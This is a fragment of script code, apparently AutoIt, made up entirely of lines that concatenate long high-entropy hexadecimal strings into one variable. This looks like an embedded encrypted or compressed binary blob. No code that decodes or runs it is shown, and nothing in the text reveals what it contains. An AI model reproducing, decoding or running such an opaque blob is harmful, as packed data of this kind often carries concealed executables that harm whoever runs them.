	$j = $j & "CAD592AD208219B342EB27740F257B6883849AB93FCF5780E7444266EF0B4293A24E2657FC47EBC2CCFE6522BD6DACAC9035CAF4A89D3F50AD31B678A82DB28AC97792344E8670A612DF11CB3109F84710E2CCDB41C7DAAC0B2BB73E274B08797CEE4E9CBF5AFB4B7EB778A835856ABF2FC180816C3B85D6FCB7D3BD9CA70C7180F588FBC0C598B5A008FD5D2E3C4DFB73F375148FEA"
	$j = $j & "795D92109CE0917D10C7A2875177136D7A40BAD624867CB9F371976FB99C7F84E0EAB988B3E5A2CB52E5B2512123B4CC7D161D1B5E8FACDE021AB1C7743CF56DE5B1CBAF1F1BC418F1E1AE665B141CB1D4C28C395AD31751D56851B58166ED8E02799B3BDC556A41BE2D0A3F2C97E3FA41F0F83A0025DE53654A08E2D4BD1733A57A0FAF87B2CE0481AEA3E6307D7DF0293E5215BE22"
	$j = $j & "B9570BC8D8D8B2BDEA2B8C2120059766821BAF5AE68168CA8F9ADB9995D600CFC154399ED602FC4562D847433E44B1039B258E57D97F58C9AF410CDF08E3A6B4B8BDB54616C4395CAAB716720AB33E27068D0554E794C9EFCC294F704FFBC44B1DF3812851C2DE2260FF1689C90FF04BCD7BF969DBA1BC669A4ACE3C782BFBAAFCFDC28A395B88FC90E6E5C1A287481C0D2E1204A25B"
	$j = $j & "E0B5440CBF2CC1DB011D46892E262E65AC433C16BD821BC18C2FABD83DF70A59328A504365C69D0D751C9F762939EB632DB1379D5BE8F20DA872C6EEDEB67F443964B21FFBABF753FB3FFF2EA3729EE99767B208FB24E156612201AD9916FB2837F8B21F6E4259A7404A232C506FBE85881CE7EEECE53BBC5865FECE226BF8ED01452B70BAD5891F2EAB7EED3E5A68155540523D8B9D"
	$j = $j & "66B1E319861ECD0A7E160BE613C7A706F4F0F4E81EBF3003A47DCC88F454670668792FD93F42EB76CAB61B43D3E6A5C3AC38C5D596322277E18DAEFDA0D039619E804ECA399CE0818D0B9321350B567BB9B77AAB23C901545671FCF1D90D8BCD3D99E4C38E70065A8FCA2E815CADB28EBAB3ECB8245584814CDB97AA8A5536B826269E06FE2654A19CEEBD3D54721BCAFFE2B110B6A5"
	$j = $j & "8A75E7A2AF8FF4A25527BBBFBA642CE035044A72C1921412F01FF23E0C528A411B82BFEF65B39DF54DBBCF2BF6F804E97261BA5E9A5049E156455786A64C49C90651CF5F9BA7EB9D8C65F6E5F38A0F3C0B155CA05CA4DD6E0FCD652FC74BA311CCE06F132518E1D0A890BA5745D6FB5C0DE77ED4AFFBF4907EA5BE6F61955C1C95FA453A5F0436E3CAA3A7F2505945FA1421FE4AD846"
	$j = $j & "4D4FD5184DE9DF64184385E2FB85BA54CF5775565A88991196BE603FDBD0974D209B380009609295121D6D97E7B8440BB5C6DA0C7FA1CCB85F68801D7180BB321BC4390E04913B96F9B10A253B44D13852EAFDA1E7E8F4D5F7A34AEE647D5511C631EAD69A88ACC76834858A3C095EB1855F73DA2237D4C4C322652D604DE4B7330027AB7309D47ED38C83822149B93A215878FD68F2"
	$j = $j & "9066B54538D4FCD8141AC262E7DB89979F0D60F2F1150DCAFA304ED4C5711D353C887C7B8CAA4777EDC0323E218AEB0987DDECA4E44CE06E2681F917E7DB41D5D2DB0933B7F9E6D55A345ACB7AED4E878BA3E217D51DF27FD1CB5BE424B6920D53D76E34F20D2241E6EB3B6D5F650F91F9E89E87EFED05EB7AC2FFF937A33C0822E3A03CD73CB8AC9AE067A1FF92A08D7A75B2FDC467"
	$j = $j & "9B525C65148031983789B4DA2EDD1D2A3E2066A846211000F75A93BA39671254678693810F8A499C69E26A989386714656C90617FF70F96A47AEEFEAA0A146A88816449F5C7DA7A57DF994C8EB2F29CFDCC980A0C4F7B728AABCBB33F2434AD71150AFDA2380FABD3C93053A4B7E9103CF1167AAAEDB671BC14E6C3CBDEC18DC1F05808A5B5A9B5F36CD2956AD3C77169541BFF1CFAD"
	$j = $j & "64E1AD1C6F6B2A37D55ECF35C3F34D44748B9CB6E4268483CCEFADFA2D8C7BFF3293349508FBBEF35896C009313AB25E0D8E0E5863805D1E331ACCDEC3EA0301BD1FD5565940B1844ABF87F64727422F2F11CA08A0ABBAD8600788F08FB7A574559273CBF73BE3202FFBCFFD76986498C031A82D327B68D58D0F72BEE15EB3BCCCD7F9BE93CE172AEDC5F8E3DF3C27F903671C1CFC3F"
	$j = $j & "D4BED56F5C4861FD8C9C039D948A3F2B3FF142F0D56891A355F498F4046F5F8886F6BDD7A10CEC790E532117479193A0C0AAD453B7777D9C1827EAB612B0870BF71CDF1DDB4F30C431CF30915277B38CEAA19B3CF9D6324F138E35E9B91F2FC8D1788EA136E65671AA58D11DBEEAC8DBBED601819B75CD69CDC8F6CEC9F7CAFDB9C0F42217F0DA2729A769A8083FD8C05AE59737825D"
	$j = $j & "063D79DFC46053CBD20429DD1F46D8717FFB7F42432F2004CFD4D8C47108CC75431A370F85F0490EE9F75D9CC3CFC5E43B4AC55811256640215731BF493DC892E37EE9F4BCA4DDE77F7F998CCADFBEB24BD73EF928CA1C1352C09609C080B30CE19681FA057F5964D67707D37700F047B9DE2C5E4F3FAAF1D5E36EBC13C9704A8639E53DF62788A89DDC84D06413FB6B62E914F7224F"
	$j = $j & "EF2AF2A419BE9B7AF177EDF7FB55759F964C5CE7146D058772CA746BA7AB0ABE048EFCD54308BA46D90E0EE1185AE791B44EC02DF5132D772F417F3A45AA14B4CA16FAC90CF634D08FBD9F4C0F07D0A0B4B3F216EE9E6C42050F1E7004E1D4E24EB4495EE64B695CB9AF2C5903DB636958D02711419CC869C5370D9E3DD28E1423F03A9232CF3A9E825B077A9FD73D751EFD8BE43549"
	$j = $j & "86B1873F037E3D30CE8782985F5CE54E56A93B6FA90EC304403FB05902443C79B487B37D2FDC87CC8B41C7BAA0643FB67EE5F478581B092B22248F5039B63FF5C93434D9C0492806C8709E2240F1EF39770DD70F56DD5A8DF0CA982BFFBF86252FEEA4709CBFC3621713A7EF3D65E8BD3FA62E8C6C1318D425E007CD4FE894A67CECCA6181E6567F19D4AFBA80D72A2037690455CD24"
	$j = $j & "479295A939852D7AAD7D138A47AD1CE59E13E300E47E5E3C0BE6B3222F35FD012EC7DF5342AAB826EEBA1C5BE2F9E18F11CC510337AF3312179852C61763D496FF0537EB94BFDEDBD0145D24A1312976ACBDF7EB8542E652BB3065222A70DB6174BBF7C764239A1AD813811696C3B988E032AFB3AF0657D429150F775492D2692A76B9F4A09E144E86C7DBF3017F48A7F931C78ABFDC"
	$j = $j & "2F414AD3F543870557408C8D80F00DF988DF791D8963E87A63B2573D880B4F37B86150EEC5CBD80851566DC70D404FB422F444E6946576F2B4C5050FE207BE2773EF062C3C6D957DE1DFD0AEA00F2DC17DF18C09001C233769EF41CA0CB40823B939E4B646C49C314DD04EF3F7859CBD71700CDFE1553455050C04957533484E3F510B7CABE4E94DDB8AD45DF904D42F91C35F089ECF"
	$j = $j & "2A1B0A2E5ED8D5E41F5E3C4EAFB96B32424E81FB0D7904F011CA8259608C9DD86541A19546D414C11A71036C7EBEFD98841EFCFD4688F04BD87C199F11DF09D2237F43CE754EE253A6DA4E5500637B340D0DAA7028CA231FF93F8838C07E2A5471CD29CE27520DA4EDAA5B95C7404EEA3A6953FFD23C017C9FE30D93E98B75A234896E0BB6814F6F3B5A6377E2DE106FFC7E5A7CC5B1"
	$j = $j & "6C956679F0BFA6477F406369D52E18AECEA3EC80741D3298A7851E8F3D904891BB0E70E1CBB10EB63949A09A3305716E977D5E2AB36355BEF490C45866A39A8BC345DC25D5017285FA4C724F8349C74999098B12807279CD67D957D9D5790F01E57BA0941267B0D0312624C721462C7E1D1AC00D898CD94623E79E5E6586BE7853AACA286763FBFA226F7C53DD8EE86F8CE1805C727B"
	$j = $j & "2DA242D2EDCE0D0B8501757D5102BD859E54A07440282BE1346D5070C1940A2778BD90AD4341397467F24990B04570434796E0FE6119448B66E3D9662FEDE6BBC5FD5D56E12836DCFCC5FE29BAD67799CF5C3B74C31763007BDA09065189F1B547449563EBF0F651246B37817FEBF4489345C209F6784B79C4904E4340095C4164291A9B285B3607407C44E8EE66C0381DE080358393"
	$j = $j & "7F1E92322E591A19114244153A1E6A4B2A7151CA1904E7CD024D7E0344B46B535B7659CF9F288DA4481E03CD211BF2650B86C55DB3FC62E3045DB2A10711882C74A4F88B00263D98FD027CF5905DD7BA79882AA6A9D9AEEBA29EA2889935C0AA1D5B8B4D112D0DE247802A5990664FE6765CFD0C21F3462F126310D07B3FC16BA3D8432F4A409B3F20B638B6B6DD52A84A959E700F65"
	$j = $j & "1092A30FB8120833BD905A2C7D9AEDA51B923E1C97E4A58BBD790441C47EF99AE606B6B86E00BB0AD388E793F587843AB25A6A7288835E70021EFFE3D4865019382F8F07A5778734F1B007DB444937BB0091532C784CA27893DF1EF4DBD7C9EF4B49F89B62BD9FFAB7EB95B9A38DB36DF67CFB0035CF9CC4F56A38C195D28F9565C369811456F83F7DEE552BDB37DAD7653B71CF69F9"
	$j = $j & "19C10EDB1A6A3A19FAC80E2093CF0F979C149A92D580CBBC5C907D744FB7408C56850646E6E8BB9DE63F64F57FD343A10B6AEE1784CC4D78332D604C37F544D637E1F6043F8B0EDCB370B8D186AF1156AC31C8531ED8FEFDE2D065ACE4315EE924CD2449672621243D5211A3BAE72C02B89C716FBCA3774B20F5A845861D520B3BCD3EF1A11912FDA5AEC3012E359662D33401FDEDCA"
	$j = $j & "0133843A21AAC0F6859E446AD74642FEA55110807F1C364876558C8F66435992C613701721733AF8C3D85A933E51E6BE02085185B6A96EE149A7ED7AABAFE248F4DB3048D5785211F2FE127C443E9E229FF9EFF335DA1AC95CB89E4F5591A0C39DBF7AB241ADFE0166B78B9E5ED834D2F7838049922490C40B20A82D0BF7B226E5EFFC01D7E5FC2EDC673C88BD233B08A6FD87E7DEF7"
	$j = $j & "63C25785C511724D9D5EEDC997A2AF4DF7118FC49E347E1ACF89B3F8D25ECA90FB8D9B60E3958E4C842238964F47A3E2A1830A95A52B732D8F79E1C55B050B71C001A595149AD04823C9F739E5EC192E7163FDB9B0167029E7BB8B99A9321FF2EA7F6756F5830D5261C37A26EC1900E4FEE69DFD15B3117FCAC695BF277FF8E440628F5E6A868E83735308100776E09A5BE3AB6305DF"
	$j = $j & "217A75C74C706DE0696A68D7B075C402A9C377D70052E713FF16E2989397FAD908DE9427865E3974C222404291AF8EFB859C76885D35B55E16E80E80A79F50EAF67BAB5E26174139F66BBE251E6690D07DB58FAF6CA1F6ECDCF4EDE214673DF2D7B6054F9C19AF7EE5AA0D96A35C954B99DA61108429E9FD49A4349313DE84081E98B2E4028CDCD6AE92D43DDCD058F7C52DEFBC716C"
	$j = $j & "E2B16AF26D21EEE302930565BC4C10FEFD119C4BF36E66E00C9709182CBA9A55060B87F5B0ED92C5083AD7DA01943CFE516B3FB2F95C360B33B7F27344F814474162647EE6C786178BD43C023625EA1FE5AC1047226680ECE42DD3003EC501546FB0008116F73D229E5C6A1435772156585E4E6F842F87E2C1204FA1031452EF465D6339189329E87609F94BA77D8DBA0B933AD9517C"
	$j = $j & "305BAE940986515A24340BCBFC2FEB37D416BFFED8D044790FC65BC12ABE7294DDF27001EA69F71349AD1C4E582821B4692751606ED873D499613E694A53E0C10A79D88723FA144109F3C9630A052CAC4244367F151DF1EE7C36DB55E4BCA80CD018AA7F42DA52C614F6F97AE534E157CA53496959F494F737C3D2BCA9AA7D9B82DEC7CD91B156A3D8230F53ADEB77D46EBB459FFB1B"
	$j = $j & "C0250292B9E833C9E350AE4A4C53AE92589A90E2EA1BC7285BF59B821AF576A5E52D39D3C6EEB77A765CB3BDB0ADCE2A831B065590AD91A378A4BB6FE72985A128F2461AC29DB7078BEB4DBBBE871D960D01D5CFD10EE6E7306872E70AA9A7494241E136EE2086CD82720A38CE5156441EC7D9F48A814ED87AAB9EFC211084A1CED887DC6BF523F23729BA2CF882ED30C5FA9691FC20"
	$j = $j & "10037C465F73F9FC4A87EC165AFAF9DA133A6386116B99A62B4993B13935D760236785FA34B0BCB1341076018A2823C69B1377CC4B8BEAE6D2487474152128A793A7FA3E22D9D80F9824207922DA0442A08600B0FBAD2182C8CC0F5E4954B72BDF50D2BC387B82EC457D5AB789C406E9E2798195974D04FF4658E4CF6205758D8FCDE1E8EEA5D19FA9D206D609E2025EBECB7F946E51"
	$j = $j & "49588CA4319FE878983647BE9DFD4817A7EE12719713573623643375D2E289CE3DA9D6834445DB28C53332F02C8A6EAAE1506555C8D35A567B33BA93764FC67DC247903549319989C25D1AA445D719371A2602A99BCB51CBDAD3B0950E5D9CE0292901BED1A1673551AB8EBF5E1DD25D0838193D1FA5659FD01CADF63526525CCF6697FC3E39BF8B60CAE4CA0C50A0C7EF6EBAACF16A"
	$j = $j & "A2823FB98A709BC274D9A9DD5E4D918F78D83E6CF8C4526708114A7998E376F651F90FB0EE97D11AF54596A233E4C896FDA8719EA56B12EFBDCF661AA449B0C4F7A5FFE764B0E7ABC7E3CB2D70B9C81AC713FD8151E98B1D50D7786A6B3AF76D0F1D2361A023B57CDD1607DDDDC5106C805CC4768A6E6C007E6930951EE9F000DE5531445C8E5E18F22CB4D9793F312AB4108805E840"
	$j = $j & "B273A89D23A41D77187BA808CF22D1FEF24D48EB374D404372FF88ED8FDB22C2794949E72890DCC47F062AD2084D28970244FDC7E157D907335FD5983621E2D42F27A30CE2F80A14699A92F36C367A53B40E2BDA6504D8DEF3D80428591B7800AF7F72013594B8F09A7629877A6161567AE38EF672064845C162D36D7AFA44AA80184692324CC1E43FF94635134B24E2DAFFC683C890"
	$j = $j & "1BE39EA0CE965B28E552CAA34CBE79A14D4DD7A47F87EBF13F99CB11855C9EDF0661598965B96C3FE58E34C69D96E40BA52733DD4E53E913907B74E9CAD7C964E4DF6DC0A461F71D2AFEFF08764D858350DFA2B37408F8FB3A63F297764F8290239940481649E4ADFEF948C7A4DC81DE1BE1E56F04058F0488A49D2E7114C3530D7A856D489BA179CE77534463FD230975B520309E2C"
	$j = $j & "FC512FC228DD7525B23402A904EA0E369474F9FDAF1B8B4C2ADA4664614D66CC4B7D3838C2466D3202D07ECE3149AD854C20685B687AE441A55E9283CB602BC14ECC079ED65C3A22E0A37DCE41254DFB0D4BBFB8578D4BF80B8A1759F04E6ED0193ED1B71E1518D97EACBDBB332111BFCA7446EC9DE5F855A9102D88E60BE79B2815C88ED9D280B7D8E1C5024D02BAAF82D7FA979FEA"
	$j = $j & "94B1F4C8144ADEF4A4B108878D61CAC97337DB2F44BB254DD6C6102ADFCDB5D3124E297F83C3EC1C3717D64C3CDFC2AB1DFB76ED354CA592CEFFBB20209B0DEDF62E2C7FE898AB99E8272955CF2FCE128D5A91A5717A75C720EE4AA576AB6B9A7147FE3FDBE49EE6BA91500271428B231A4EF184494DC44AF987B05A5BEF10EF588013B41FCC124FC7BDD6D60C125A64FE8A45BFBE40"
	$j = $j & "5B3E29D2BE23CE22095BB3AA907BF5381B8619EE26ABED72C008C6266BA8A0A6032513BC02F1EB2B568D485CF91E08D6D1A55AC305383399BFD1D449F0DEB3BB4B4C2E30D97CE7A856ECFF2F62226D7D362C5322C995823C7AAFC768AA5DFECB003C3953B7373C7260670F18D56114AF8B4675BC1C00037DC4919B5A5D7B9C76ADBEC0B1689D03D318F1C87082093A0028082FC0899A"
	$j = $j & "12070A24971C5BA563F1CA1878640B1711416C4C0E83F64299E1E777D4635BBCFA177C7883C1CE1F3148C80D3E3F2111373284EE2686F5380F255DC676E7659B6525DC8567197560DD1903F3AF033DE385098AB66F43AF215AF4B3A40CE9EAD90DD13962791776F2E4B27D35FC566BD240AC1161818F6088344C9BCFAE81675E22468C0489E7E83C211C18C5395E28EEEDD854FEB599"
	$j = $j & "7C7790E8CCD700B5451DF1EBA756A7BC27D94519241E52ECAC37943BB69A3BEC7056E9AD761F1621BE4A55DF266A4B22A25326FFE170C09742DE0C8CC28D50153FBA308E6B6C1D020087846C9481E3B0CBCDAF925E61D58F666102754B4251EC905B9B534CD08A0C56E1738CCF1D95B8D651B72242D54F871D05AE0DFFA89107C7249556CC4B88CD52C7F9F80113E1FF247553DAB4C6"
	$j = $j & "4FC5414168698F7541E218F7412B384B0F03A9A9C920EB2F6000E55C0AD98F16ABAC89A736573C7789D646F664D949F94054E8FF892C432A01049ABD17ACB644E7F00081AF607BC63CBE75B5BA6D9D93FBE94C9314BF00980D51F09BFB9F95A3503EB45403111411A9D2CD19EEAE01B8A59C1C29F0DB1F9021C2420C6E802629E7482F61519BF18A335024840C2DC1000D4DB1482100"
	$j = $j & "B6A3B3C4D261096AB3C8D10307EBA5C8A7C04B8C55B54D29D3A5721B689E23011BA173A2BC63B1838D087B83FCD7C5A16A256BC5C051739E083F8539C2588910CB82AD863DA2F873D0B73721073A748BDA028071C77C1D45AC1D07ED85E80641DC1D6BF943B130278A33B99596E44B87EAFB010F73B94EEAF5C6BC0B15A2645810A3278811806237F90A40347589CAC6444AE4AAA4BF"
	$j = $j & "A208992B8CC139F43E646BD6648A374339453027679EAB703F23ECB6EC86B7F25CB89BDE1C46F7016F4409CF9943386972C1C433C00012421CDCAD04E14F1522CECE9198BBC978EF3D711A64CACEDC3F364037158F95710679B3D57FE51CF9B4CE2C10F2449691955CB8BAA5F47D8D9A3D5C1F367D5552BFC37C7788CE1B6C54DD85C868411077A04419AC930A793AF132ACD9E25AA1"
	$j = $j & "CF4AC5EDB8CD2DFAC6DCB0DBBC23B7F14FA28BF21B5BA31A64F72A152A1FB07471E6D164EBB5C135C27C8E7E77EE30C8D367F103A3940D5D52DC41935B6ACDA767D226604F4A3FB1412966D2ECB592D74175B7AFD0D457AE3710564438C953AB1FCF9EF90F2A0C6854CF169DC266F14E2FCD566DFDE10B9D9CCFE7A130DC41C9A8B1B58270E7014434915CE98A5C756510F7E1CC8BAF"
	$j = $j & "CA2EBE8148F360D6D81A6010A89996C0BF24DB28EAC78E29C7F26E8799F6DAE7A3B839D07B012A36AE27E25C355494B601F359488D34DBAA3422A0B47AC01DEFF484B9A756CE50BCE3A3CD4BE5B96A8ABFC330C526E2924BA2CBA6E86993DD9282724B31405C2EF3094335D5191031DBE57AEF250881A07967C830EA68BD0A664B84672781EF1A25C699DA6D469BBE9D825BE21B6091"
	$j = $j & "00F80505A237BD8BB843CD6C0CFA729899F851232B7E3F48464AD4A8FFF10D094A8CA088C1AC8FAEBD1DAF6FD9F32C4A7ABF026C18077FB21BAF1B9F4AEA16EAEA5EF3B5B579DE87B6F1F412C1DB6FDBCCCA38EDCA2ED030FE193FCA331F39649AACC5522838693E3E29D36E4AD1E1C5AB560A52A3452FBE493C8AB4D60BFCC389560BE8D3321DEDFF1A7EBFE7267BF267D504D2A10E"
	$j = $j & "5E43454C5A79AE0F75F19D90A092E2BE26E5A2F6EC8D44BEBA2BF4ED1A0332B0AC19A10504F975318A8E21C293D64E6104855D3F6978BA632C40AEDF20DC0771DAEB1C2AAF0D6C24C6FAFBA170B80016C53E025AF97C44C1DFBBF82F9C70902A5EBD3128E46597AD5D52F249AF640FA3CC0ED3EB38ADF24451C647FD42FBEA5952F12867520B4466C27A4195FA4E5A2AC6158FFD6A54"
	$j = $j & "5802C67C117F9F077D2D643D24AA9B3ACF3CD7C436942767C6A311DC3EA4D64A592481464AFCBA0A53AD2558BBB8A5B7803DC2957B8A03BCC18FBAA5DA718CB5325D13C546086FA89A287C90DF227F6ED080748C89E5F206DC77660D4D5E794133B4392DA1AE9D2612634CC7360E24F28801E06C0C50B5BDF33C2F5BD7DC20AF2823CF9BA4E4DC4EAC2268DA05E3EB4DFA67FC7FFEC3"
	$j = $j & "7B07428356E05BBB97C2B0509F002BCBB03AC37BEA562F6FF3FDDB1C764DCD947D5817676332E20BC2CC44A8203BC66F8B5304AA2613BB3199405E29D75577E572EF851940BFFAFDAD81754A28EDCC89A1071C305BDBCC7345206B8261A61203B48723643878994A64564154F6375B47EBD2BEA73913DCA6A067EC7C41A5A5C893E5A07F1074F50E7EED3B5F8A2FFFE1C2A90121EA38"
	$j = $j & "30803662F654A5F565536038E316CF8934F0C09C55EBC035D9FAEAB17D8CE06CBCB26EA0897F6287112E9B081C2FA3896A5B176C302A66B52D3ECD1F60517D551202EF816B6504A794F31E304FBEE0379295CE12CB9DB23FE0791CA61D45DDD3748274CE39EBD4B7A257CD4EB1884A4D1049663BE5D50D0752927EE0E46A7382F3670603A964D3DF7C554AF30C404F8F058AB0CCA973"
	$j = $j & "E9A54D9755A696A533E78AC19DBDF7A271493CCB55F24D12A5CB679E03358719B91A5FC08170F7F75C0A3C32939C6DE65C8E6D6B05B0BDCF46772967A5F5D1F53329EB60399DBE32F222A4FE4813717AE0D93241072D6DD4D09104F8FE65F2345754EA045D24944760D41757700F130B44ACFE08C5FB7D3D325359DF1F207522F9960AC071784376E0CA9CF9BA557C4CBB9D1101D17F"
	$j = $j & "5A73BC8892D6B4F08710FC78C1BAAC971ACEF6CA74C8D8585BD80ED5A3D290E72EA0BF3F6C7DEF7F1E0A68A03DB1A20DB7ED81656550479E4EB5F4631DC4E000C004D01049890DCB991D0937C4ECDA5EC85FAE5EB1DCD2948B5A9B0B42E833123BD7547F5310EA21074B23A6C065E7BEC07F89BADD9ABDB37E14E81C7FEF54306B1D0F5F478FF123E030C5429134EA385D7E8DEAADE4"
	$j = $j & "1E0AD94C3C626CC5A9EFCBC16700097A8F6992957B35BF5581829B8AC2204849A373CD004B39DF27ACE5D1EC7A9455CEB0E3B850EB53C8C729AEEEE77FB5324D41044993A5E50B972A122759E1B508996C8B6DBF6643E76A08965E08E6BFF18FD6F054E548A5C7FF60C8F4964C5E1350A91522DFE2B431BF8137010DE4F6FB4C85940ACFABEFB0CB50F0E1FB3CFFD1F8B95A225F6F10"
	$j = $j & "B75A1CBD95901518B8B44CAD9EE4B38753A23AC33778538F8C6ABD23BCB098B4ACEFB97DFAA072F170D3ECF3ED20834FA300BB73A7089DA58004F10F18EFCCE5BD6D00435E74533D3073FBB630617624E0319B39A1800A270EA5450EE276DC58E9393D84805A64B8A3188F9082BA1A822D3F7899D63261E1B4688BFCD85763A3740E40C7CDCEC67D8673184A0982C36A76E94A6629EE"
	$j = $j & "A6D72A4E49E376EC65D42E73403772DC93D1EE7AB2ADEAD443064956D1DC8C7CE3EB9A4B55DF1117F45B2B6A6A253D1041F527D14D80923906EAB840C0CBE76978C4F828BB1AE791EC33B92A3D9CF41621A1C9CF8A18099E42D20FBAE1A6F28FBB829BE6B832E1C14B19D593743A33DBD6D1512F7630ED8482B4A83B78AFF7750E0B2B74983DE8B37AE4EC0D87EF8DE1C4A301D109D5"
	$j = $j & "69155D3247401E6A359900E171301C34DCD0B7EF406E4DFF233D1262484288DC7784CD6CE45C3915A3A4AD15DDF7EA557A835EFA72F56D0B6F43344ECDA81E9A50FDED2E25E7568F8D445A3A61120A644298AC328848A21D6B9B52C29109B21F5BD6A282D6507D63DC2E3030F052110EE3C713812E794CB91436A3B10C347200696ADECABB992FBAFB5870F1F5DD321DE1A7D1B0BF58"
	$j = $j & "43B6FCC977AA1B72097C577A2C6244DACA61286CF429FF5903546A37A2001BA1A50AB0BA59B62E75E7B9E670F6EF8DB43DE75BD3AF37F061483E78592ED33DD2C403CCA34DF94B9932B301179B2D2DDE84ABDE7AA0E74AE15C4B773680F12924381781BF8AF1ACDB21C44E08956D6DDA48FF6258EF86CE876DB53941D54A425003196BAB5E39990E0694E114692B4B2BDEA622FC4928"
	$j = $j & "898C22204E4165FF794525FFB5665B6DBA317113FCC9B7FD7C9434329671978AC4F68FAA8E0BE28A138EAC3AE3CA1B42F626C13AA47BDD3D2AF9469AAA215CF47F1CF357E0B79BDB4CE2A1CFB50DC2761209F2A6E88C316AED89B3F65026EBFB2EFF643C6C3DC94A7B661A78A8DC192797FFA510DC0FB5772DA2E8E2F82340CB8A2F6E3D9BD0566446B1D64A5CBB999905CA81AB49F4"
	$j = $j & "752AAC4236DE2E4D50A0AD75904E18D87A9E21BB73EC4001BE433557951D8A826E5169CD65E7CB31EA1E43FBE1C202923833BF89CC15AA452B04E6EA12F2F481FEFE93F4DAC25BA8DC30D2270010A74427668C4AA1F7CB89825B74F9E272FC1F1C5B0DAAA4EBA0EC37D232032E560C53A674EBB0D607B366AD932A093533811A2C86A6CEF43F92B9ACAA21BFC249C80209117FFA545C"
	$j = $j & "EBD66F829625A7AD097B7824786B826675DC275F125BE76ADD688EECCAE3EFF778324058B42A7286BF23E1CB956C5F22EF009F68BC62FD45B23C8101B19489F1C9B46BCCB7E6E17C875B0356C5CF02F8E816206F99F9CBF2D5AA24081B1930B21C553634B3B7CE7B89B8DC80AEBDF16754430B8B340D8C5BC7159D5D773116E38EC1E331E94CE2943854E51829116E317C2CC0DE4EBE"
	$j = $j & "1338C115E2BDD773DE434A5E51CE2019C67AD3BEF0CB491519523E9A5CC0382EC6E7EB40BFB17496EB5AF009EA44B0CBE826ABCB6CB1967383328C3A4F556420357646F6F67216E324E866F911E8CE3241ACB670CEA3E5E6B9E741E1E4BFAB6C5CBE69F563F6D64435666DA31954E84FC995DEF68C14BB2C4B40ECC5BD9F4502F9FFBDDAC10BBAA14E182BF71A36F826577D0E35F4F1"
	$j = $j & "1A4CB531136C2744840919C83BB5DAB2E73EFF951203F128318227F0E3FCEEAA2E8A5026FED127AE18B3BF5F8642D14AA8D1CE475306C4049FF05BEAAC0151E115A218EF64F5B59B9D2FAB7AA88B78AD3BA0E32F85E3E382EFC44036CDD68413D5EAB369D4F9B626DD18F83C0A2B541EEFF2DFBFB5EC812B9A8D064565194741AE16017EAA00DA483F9D5B764DDD0AD49ABCB79BA2B8"
	$j = $j & "878841E0671E728592784D12AD3EAA508B5888781C5F182846EE06AE26662DB39D998CC58F5E6347831DF4642C9FFE4DB8D6FB7DF47B2C41AFC9D33F41351A54CC5EADE2DF73A4DCB3CCB3A9207E89E1640596E44377B750B6CC484803694676B2D5EFCBB9701028673AE9158EAA2BDCC37E4A2C2576B462A92D2D3E1BF3F4132AD25C28DFEBF3794B98929EB5CA75DC8C31A61BB3D0"
	$j = $j & "7D11A98EF93E470AA0054746A41AA19E49CF7C3A3B49D187CAC9F4FA926D43A22826A551FC0397F8B4C0292C5F1B71A8A8ABE8710498F0AF155FE0A621181463AD67DF959D7523CF2AE14D5235820978A408F7796DDA04EB4130DF6DA56622E29CFC8D57259FD2C0859DD9CCB395AF8771D25464C211C79BC41D1200C36F5D9016FBC4094733CE431E52FC75C372626EBF3DC1BBC9CC"
	$j = $j & "7554B41EFADFDD538F85A5EE12853317575010FBF241DBA205A5825D8F2669A4360C7D272360153EAB1C9543D94986B7237F749536D047AF9ACB3135649F03E1A464CAA8491D10380B457A135DAE8868D11B092B3ED19DE6CCD44CEFF22573909B1DA0274BA4D3AA89AF0FAFA28D7D7620A73F86BEB7AA22258E1E4DE3075AC3029AE9C9F7B7D7E8DB898448E4EFEB3664B2E9C5767E"
	$j = $j & "6C89B5EE98A3A28CFE08CB5D24EA12A3E80A8CCA3D18F72BE48E64BA0FCA6840987CE8CB987D567C1D9CAD92C6C5293861A9D00150E1B1912C084F2BBB0DEDB9CC644DA9D5C7A67382C5C5B1B6B9A54D8A4EBEA14AFD094CC54B5DAA2E18001E50BA1B022094D9DFAF76AEFF2B8882CEF5D2A678A5B2FCE27EEBF3D99349A8E38041AB42C252CB55F42BDBC68A5158B0BAD849B4AD80"
	$j = $j & "B7D722430CA494DBBE6AC3925CC0C0ED2125AB97643D95BD71A9949D8A54E13BE05EA7097F3FBD8C0123605B2942590C4D0320019F5FA3338E55B9473FE51A4EF8BBCEB872A06DDCA9DD0CF776311E338C5BBAEB03CC87D83B64AAB29D36040050CCBD524D538EDE6933AA5257F73F1C5752BAE484A2D935099DA1ADA1C73EB9B9EB37EBCB28A074CC101812509135A4A722471D0DCF"
	$j = $j & "2A21B6EB2CA00DCA266CAC89C027F10B97DE4DABB8E787BCE3C8A1BD32A38157F14441D2EB734AD1360079FA69B8B2110FB887701F69A094D34E2DE00AE62D4C372F7239AD00EE800C2EE6C50306DC7190609AFAF4237147905ADBFBDD5BCD13B87C9400DCA623466C872546F3ECAC965AE77F153E58CCE4945BACEF2894B489AEE0059ABB33923FFF910E65717BF8FF8A5CB77C315C"
	$j = $j & "CFB3AEC92AA32E416E9B0A771C230F1AD0E2192D736544CAD634547635DE455C5519E684F2F0A28DAC6A09FDA738D10DEEAF4542A73706CCCBCCA34A50CBD6CE41DF9C6A7D3BD9D91E29F1FD0CA56865FA64A1F8B8DE0C73427E60A2E16608A28D16DDBC7C50EACC1ACE307C653D3AB16EF24B9F2986AAC101D0EEBAF045C9B5BB54A015A3F8198E66EC6FE86E0F4DF2454391428754"
	$j = $j & "14E3FD4A983BDF2259AD15A97B4AA5C3B9425309974B4E437777A1F72D8FD3EF64988787D20B9EFB16C6DD8297E9F1A7342EDDD1C6593A742C71E198DB86E21EB5424569652E1EFA56F8478E192D471E0E0FB8C1FF900D57A84E6F2A5641CA1922B55BCF3A9AD9FCEAA9EDF20B759FCDA55A5B8F9354F41DE16587CE075AFFDAB4B22F2BCD28E8DE3678E43F84762F19909B3D92381F"
	$j = $j & "74979D439C2064C9E3F6826C80BF1364EAA3CAD32FF159D96993AF26144F6761944AF636F38C3EF263C2490D4F2223964B7179FEF0259E61EDF553A35A977CEC33367BF7ADBB82AC5BCB821C80F25DF022F15E61AA8D46DCD046AE1458C0D8B8AEA8FA329225F773784502D11DA73EE8C3FB4C7F920543D74734B5AB85C02A34A6F7B21563F6E3E511FB0D4F943425729FE2EA588693"
